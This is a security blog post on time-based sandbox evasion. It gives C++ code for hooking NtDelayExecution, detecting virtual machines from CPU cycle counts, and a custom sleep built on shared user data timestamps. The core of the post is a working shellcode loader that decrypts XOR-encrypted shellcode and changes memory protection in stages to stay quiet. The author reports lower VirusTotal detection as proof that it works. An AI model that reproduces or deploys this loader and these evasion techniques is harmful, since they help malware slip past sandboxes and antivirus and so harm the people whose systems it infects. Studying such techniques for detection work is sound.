---
title: "Detecting and Evading Sandboxing through Time based evasion"
date: 2022-12-7T14:28:34+01:00
draft: false
toc: false
images:
tags:
  - evasion antisandboxing 
---


## Evasion O'Clock 
Time based evasion techniques **\[T1497\]** are a relatively painless and efficient way of avoiding sandboxes.

{{< image src="/img/01/sleepy.png" alt="Sleeping through sandboxes" position="center" style="border-radius: 8px;" >}}

Sandboxes are heavily relied on to detect malicious activity dynamically. Hence, it's a guarantee malware will do its best at staying under the radar, achieving this by either blending in, timing out the sandbox or simply detecting it's in one (in which case it won't do anything nefarious).

For instance, one way of timing out the sandbox  is simply making your malware sleep through it, exhausting the sandbox which makes it time out and assume the sample is benign.

However it's not *that* easy. Some modern detection solutions possess countermeasures against that, for example hooking sleep functions like `Sleep` in C/C++ or `Thread.Sleep` in C# to nullify the sleep, but also fast forwarding. TL;DR: Tampering to make the malware think it is in the clear.

## Demonstration: Hooking sleep functions

`Sleep`, `SleepEx` and `Thread.Sleep` all boil down to the `NtDelayExecution` syscall.

> `Sleep` is also just a wrapper around `SleepEx` :)
> We kinda have a hierarchy such as  `Sleep` -> `SleepEx` -> `NtDelayExecution`

For instance, we can try to hook this syscall to make the delay argument `0` basically nullifying the sleep.
{{< image src="/img/01/diagram.png" alt="Scuffed Diagram" position="center" style="border-radius: 8px;" >}}

We can achieve this by using [MinHook](https://www.codeproject.com/Articles/21414/Powerful-x86-x64-Mini-Hook-Engine) which is a really awesome API hooking library.
```cpp
#include "MinHook.h"



typedef DWORD( NTAPI *pNtDelayExecution )( // https://malapi.io/winapi/NtDelayExecution
                                            IN BOOLEAN Alertable, 
                                            IN PLARGE_INTEGER DelayInterval 
                                         );


extern pNtDelayExecution pOrigNtDelayExecution = (pNtDelayExecution)GetProcAddress( GetModuleHandle( L"ntdll.dll" ), "NtDelayExecution" );

// our modified NtDelayExecution
DWORD NTAPI NtDelayExecution( IN BOOLEAN Alertable, IN PLARGE_INTEGER DelayInterval )
{
    // Mock this poor attempt >:)
    MessageBoxA( 0, "Feeling sleepy??", ":)", 0 );


    // Make it so NtDelayExecution actually gets called with a delay of 0, basically nullifying the sleep.
    return pOrigNtDelayExecution( Alertable, (PLARGE_INTEGER)0 );
}


DWORD WINAPI hook_thread( LPVOID lpReserved ) {
    
    MH_STATUS status = MH_CreateHookApi( TEXT( "ntdll" ), "NtDelayExecution", NtDelayExecution, reinterpret_cast<LPVOID*>( &pOrigNtDelayExecution ) );

    // Enable hooks
    status = MH_EnableHook( MH_ALL_HOOKS );
    return status;
}


// main function of the dll
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: {
        
            // Initialize, and if that fails just return -1 aka ERROR
            if (MH_Initialize() != MH_OK) return -1;

            DisableThreadLibraryCalls( hModule );
        
            // Create hooked thread
            HANDLE hThread = CreateThread( nullptr, 0, hook_thread, hModule, 0, nullptr );
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
	    }

    return TRUE;
}
```

Once injected in a process using any function that ends up calling `NtDelayExecution` (without it having it unhooked) it pops open a message box and nullifies the sleep by calling the original `NtDelayExecution` but with a `Delay` of 0.

Then again this is just theorical and to show how it would be possible to hook default sleep functions to nullify them, making malware unable to sleep through sandboxes with those functions. As long as said malware doesn't unhook it whatsoever.

We can for instance use it against an executable calling sleep two times such as
```cpp
#include <windows.h>
#include <iostream>

int main()
{
    printf( "Hello!\n" );
    Sleep( 10000 );
    printf( "Sleep 2 now\n" );
    Sleep( 10000 );
    return 0;
}
```

{{< image src="/img/01/messagebox.png" alt="IT WORKS :)" position="center" style="border-radius: 8px;" >}}

And as we see, once injected in the target proc, when it does call `Sleep` we get a message box :)

## Leveraging CPU cycles

So this isn't an alternative sleeping method but it still counts as a time based evasion mechanism (i also think it's kinda cool :] )

Due to the nature of virtualized environments having additional overhead, the amount of CPU cycles burnt by them will be way higher

We can benchmark the CPU and get the amount of cycles since last reset.

```cpp
#include <Windows.h>
#include <iostream>


// Credits to VMRAY for their talk on antisandboxing
// Nicer way to do it than just comparing the amount of CPU cycles burnt
// by CloseHandle and GetProcessHeap for instance.
int main()
{
	long long tsc, acc = 0; // setup tsc and accumulator var
	int avg = 0; 
	int out[4]; // buffer for cpuidex to write into
	

	// loop a 100 times for precision idk (tweak to your needs)
	for (int i = 0; i < 100; ++i) { 
		tsc = __rdtsc(); // get the amount of cpu cycles
		__cpuidex( out, 0, 0 ); // burn some cpu cycles
		acc += __rdtsc() - tsc; // smack in the accumulator the current cpu timestamp - the previous one 
	}

	avg = acc / 100; // divide per 100 to get the average
	std::cout << "Burnt cycles between resets average: " << avg;
	
}
```

Testing this on both bare metal and virtualized environments we confirm that it's possible to leverage the overhead between a virtualized machine versus a bare metal one.

{{< image src="/img/01/cpucycles.png" alt="How many CPU cycles burnt VM vs Bare metal" position="center" style="border-radius: 8px;" >}}

And as we see (top -> VM, bottom -> bare metal), the virtualized environment burns way more cycles, confirming our hypothesis

We can leverage this to detect the presence of a sandbox.

```cpp
if (acc > 300) { // not a fixed value, u2u to tune it but its around 250 on an actual machine
	sandbox = TRUE;
}
```

## Weaponizing `__get_timestamp()`
Credits to Jordan Jay (Legacyy) for his amazing work on this.

I wont delve too deep on how this works as Legacyy himself [literally made a blogpost about it](https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html) 
```cpp
unsigned long long __get_timestamp()
{
	const size_t UNIX_TIME_START = 0x019DB1DED53E8000; // Start of Unix epoch in ticks.
	const size_t TICKS_PER_MILLISECOND = 1000; // A tick is 100ns.
	LARGE_INTEGER time;
	time.LowPart = *(DWORD *)( 0x7FFE0000 + 0x14 ); // Read LowPart as unsigned long.
	time.HighPart = *(long *)( 0x7FFE0000 + 0x1c ); // Read High1Part as long.
	return ( unsigned long long )( ( time.QuadPart - UNIX_TIME_START ) / TICKS_PER_MILLISECOND );
}
```

As a side note: I edited it to get the time in milliseconds.

##### Making an alternative sleep out of it

```cpp
void __alt_sleepms( size_t ms )
{
	volatile size_t x = rand(); // random buffer var 
	const unsigned long long end = __get_timestamp() + ms; // calculate when we shall stop sleeping
	while (__get_timestamp() < end) { x += 1; } // increment random var by 1 till we reach our endtime
	if (__get_timestamp() - end > 2000) return; // Fast Forward check, might need some tuning
	
}
```
And to be even more sneaky, we'll use a random time interval at each with sleep. 

Which we can ease by making a macro for that.

## Optimal way of using `__alt_sleepms()`

To avoid creating a pattern, we could leverage rand such as
```cpp
#define INTERVAL rand() % 26 // Edit as you wish
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND // Make the use easier
```
Which makes the use of this function easier and more random (which is a good thing)
```cpp
__alt_sleepms( SLEEPTIME );
```

Then we can leverage it in two ways in this basic loader.
1. Timing out the sandbox by sleeping for a long time before decrypting our shellcode
2. Sleeping in between changing the permissions of the memory we allocated for our shellcode such as RW -> R -> RX to be less alarming (RWX is extremely loud).
```cpp
#include <Windows.h>
#include "buf.h" // Header file containing our shellcode as "unsigned char buf[]"
#include "snorlax.h" // Header file containing our time based evasion stuff
#include "utils.h" // Header file containing RNG related stuff.

#define INTERVAL rand() % 26 // Edit as you wish
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND // Make the use easier

int main()
{
    // seed our generator 
    // defaultseed could be any seed you choose
    //but for obvious reasons i recommend using the __TIME__ macro for that.
    srand( defaultseed ); 

	// initial timeout ? (could be extremely sus)
	__alt_sleepms( SLEEPTIME * 12 );
	
    // decrypt our xor encrypted shellcode
    xor_bytes( buf, SHELLCODE_SIZE, key, KEYLEN );

    // Allocate RW memory
    PVOID addr = VirtualAlloc( NULL, sizeof( buf ), ( MEM_RESERVE | MEM_COMMIT ), PAGE_READWRITE );

    // Copy our shellcode to the allocated memory
    memcpy( addr, buf, sizeof( buf ) );


    // Now the interesting part where we can leverage sleeping
    // We basically change memory perms like RW -> R -> RX 
    // RWX memory can appear as an IOC
    DWORD oldProtect;
    VirtualProtect( addr, sizeof( buf ), PAGE_READONLY, &oldProtect );
    
    __alt_sleepms( SLEEPTIME );

    VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &oldProtect );

    __alt_sleepms( SLEEPTIME );

    DWORD id;
    HANDLE hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &id );

    WaitForSingleObject( hThread, INFINITE );

    return 0;

}

```

Trying those techniques on virustotal will be left as an exercise to the reader, but if you are really curious the detection rate when using `__alt_sleepms()` instead of `Sleep` , at the time of writing, were lower (14/72 vs 25/72).

# Moar stuff??

Maybe, im busy with some projects of mine, only time will tell.

# TL;DR
Hooks on any default sleep function or the underlying syscall (`NtDelayExecution`) can be avoided without using unhooking.

This was just a showcase on two time based evasion techniques i thought of as cool, i might add some more if i can be bothered.

Thank you for your time :)


# Credits/Sources
Jordan Jay ([@0xLegacyy](https://twitter.com/0xLegacyy)), [blog](https://www.legacyy.xyz) 